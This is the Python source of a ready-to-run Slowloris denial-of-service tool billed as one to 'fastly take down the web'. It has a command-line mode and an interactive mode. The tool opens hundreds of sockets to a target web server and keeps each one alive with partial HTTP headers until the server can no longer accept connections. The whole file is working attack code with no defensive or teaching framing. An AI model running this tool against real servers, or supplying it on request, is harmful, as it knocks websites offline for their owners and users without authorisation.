#!/bin/env python
import platform, socket, random, time
_appname_="slowloris"
_version_="0.1"
_description_="fastly take down the web"
_author_="blackc8"

ncol   ="\033[0m"
bold   ="\033[1m"
dim    ="\033[2m"
uline  ="\033[4m"
reverse="\033[7m"
red    ="\033[31m"
green  ="\033[32m"
yellow ="\033[33m"
blue   ="\033[34m"
purple ="\033[35m"
cyan   ="\033[36m"
white  ="\033[37m"

if platform.system == "Windows":
    ncol=bold=dim=uline=red=green=yellow=blue=purple=cyan=white=''

def inf(msg,enD="\n"):
   print(dim+blue+"[i] "+ncol+bold+blue+msg+ncol,end=enD,flush=True)

def scs(msg,enD="\n"):
    print(dim+green+"[+] "+ncol+bold+white+msg+ncol,end=enD,flush=True)

def err(msg,enD="\n"):
    print(dim+red+"[-] "+ncol+bold+red+msg+ncol,end=enD)

def wrn(msg):
    print(dim+red+"[!] "+ncol+bold+red+msg+ncol)

def ask(msg):
    inp=input(purple+dim+"[?] "+ncol+bold+purple+msg+white)
    print(ncol,end='')
    return inp

def eint(str):
    intgr = []
    for char in str:
        if char.isdigit():
            intgr.append(char)
    return int("".join(intgr))

def inp(msg,default='',type='str',show=True):
    inp=input(bold+green+msg+white)
    if inp == "": inp=str(default)
    if type == 'int': inp=eint(inp)
    if show: print(bold+blue+"  ==> "+ncol+str(inp))
    return inp

def Eexit(msg):
    err(msg)
    exit()


min_banner=bold+purple+_appname_+white+"("+green+_version_+white+")["+blue+"blackc8"+white+"]"

# default config
headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
    "Accept-language: en-US,en"
]
sockets = []
hostname = ""
host_info = ""


def resolve_hostname(hostname):
    try:
        IPaddr=socket.gethostbyname(hostname)
        return IPaddr
    except socket.error:
        return 0

def validIP(address):
    parts = address.split(".")
    if len(parts) != 4:
        return False
    for item in parts:
        if not 0 <= int(item) <= 255:
            return False
    return True

def is_open(host,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    con = sock.connect_ex((host,port))
    sock.close()
    return con

def openSocket(host,port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((host,port)) # connect to host
    sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))

    # send headers
    for header in headers:
        sock.send("{}\r\n".format(header).encode("utf-8"))

    return sock # return socket for later use

def checkHost(host,port):
    print("")
    scs(white+"Checking host...",enD='')

    # resolve and check ip address
    if not validIP(host):
        hostIP=resolve_hostname(host)
        if hostIP == 0:
             print(bold+red+"error")
             Eexit("Unable to resolve hostname ({})")
        else:
            hostname=host
            host=hostIP

    # check host is up and port is open
    port_stat=is_open(host,port)
    if port_stat != 0:
        print(bold+red+"error")
    if port_stat == 11:
        Eexit("target "+host+" is down!")
    if port_stat == 111:
        Eexit("target up, but port "+str(port)+" is closed!")

    print(bold+green+"OK")
    return host

def attack(host,port,Nsocks,delay):
    print(bold+blue+reverse+"Starting DoS attack"+ncol)
    print(bold+green+"  Target ==> "+white+host+":"+str(port)+ncol)

    # open Nsocks no. of sockets to port
    scs("Opening {} sockets on target...".format(Nsocks),enD='')
    for _ in range(Nsocks):
        try:
            # open socket
            sock = openSocket(host,port)
        except socket.error:
            break

        sockets.append(sock) # add socket to array for later use
    print(bold+green+"done")

    # keep these scokets alive
    while True:
        scs("Sending headers to connected sockets...",enD='')
        for sock in list(sockets):
            try:
                sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
            except socket.error:
                sockets.remove(sock)

        print(bold+green+"done")

        if Nsocks - len(sockets) > 0:

            # reopen closed sockets
            scs("Reopening closed sockets...",enD='')
            for _ in range(Nsocks - len(sockets)):
                try:
                    # reopen socket
                    sock = openSocket(host,port)
                except socket.error:
                    break
                except:
                    print(bold+red+"error")
                sockets.append(sock) # add the new socket to array
            print(bold+green+"done")

        inf("Wating {}s.".format(delay))

        time.sleep(delay)

def interactive_mode():
    big_banner=purple+bold+"""\t     _               _            _
\t ___| | _____      _| | ___  _ __(_)___
\t/ __| |/ _ \ \ /\ / / |/ _ \| '__| / __|
\t\__ \ | (_) \ V  V /| | (_) | |  | \__ \\
\t|___/_|\___/ \_/\_/ |_|\___/|_|  |_|___/"""+green+"("+white+_version_+green+")"+red+"\n\n\t\t[ "+_description_+" ]"+white+"\n\t\t  © Copyright 2020 blackc8"+white+"\n"
    print(big_banner)

    print("\t\t    "+cyan+"(Interactive Mode)"+ncol)
    target=inp("target: ",default="127.0.0.1")
    port=inp("port: ",default=80,type='int')
    Nsocks=inp("Number of socket: ",default=300,type='int')
    delay=inp("delay: ",default=15,type='int')
    host=checkHost(target,port)
    attack(host,port,Nsocks,delay)

if __name__ == "__main__":
    import argparse, sys
    parser = argparse.ArgumentParser(description=_description_,epilog="Author: "+_author_)
    parser.add_argument("-t","--target",type=str,help="hostname/IP of target")
    parser.add_argument("-p","--port",type=int,help="specficy port to attack, default=80",default=80)
    parser.add_argument("-s","--sockets",type=int,help="specify number of sockets to open, deafult=300",default=300)
    parser.add_argument("-d","--delay",type=int,help="specify delay between packet sending, default=10",default=10)
    parser.add_argument("-i","--interactive",help="launch the interactive mode",action="store_true")
    args=parser.parse_args()

    if args.interactive or len(sys.argv) <= 1:
      try:
          interactive_mode()
      except KeyboardInterrupt:
          err("Exting due to Keyboard Interrupt")
          exit()

    if not args.target:
        err("No target specified.Try option -h")
        exit()
    try:
      print(min_banner)
      attack(args.target,args.port,args.sockets,args.delay)
    except KeyboardInterrupt:
      err("Exting due to Keyboard Interrupt")
      exit()
